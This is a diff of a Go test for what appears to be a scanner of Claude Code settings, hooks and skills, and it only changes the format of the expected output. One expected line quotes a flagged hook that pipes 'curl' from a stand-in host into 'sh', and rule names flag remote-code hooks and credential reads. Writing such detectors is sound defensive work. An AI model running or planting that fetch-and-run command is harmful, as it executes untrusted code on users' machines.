@@ -29,10 +29,10 @@ func TestScanWithoutPathChecksWhatIsInstalled(t *testing.T) {
 
 	out := stdout.String()
 	for _, want := range []string{
-		"Scanned:\n  ~/.claude/settings.json\n  ~/.claude/hooks\n  ~/work/.claude\n",
-		"scan.hook-runs-remote-code  ~/.claude/settings.json",
+		"Scanning what Claude Code loads: ~/.claude (settings.json, hooks), this project (.claude) · 3 files",
+		"~/.claude/settings.json · scan.hook-runs-remote-code",
 		"SessionStart hook runs ~/.claude/hooks/start.sh, which at line 2 runs curl -fsSL https://start.example.com/s.sh | sh",
-		"scan.reads-credentials  ~/work/.claude/skills/env/SKILL.md",
+		"~/work/.claude/skills/env/SKILL.md · scan.reads-credentials",
 	} {
 		if !strings.Contains(out, want) {
 			t.Errorf("output lacks %q:\n%s%s", want, out, stderr.String())
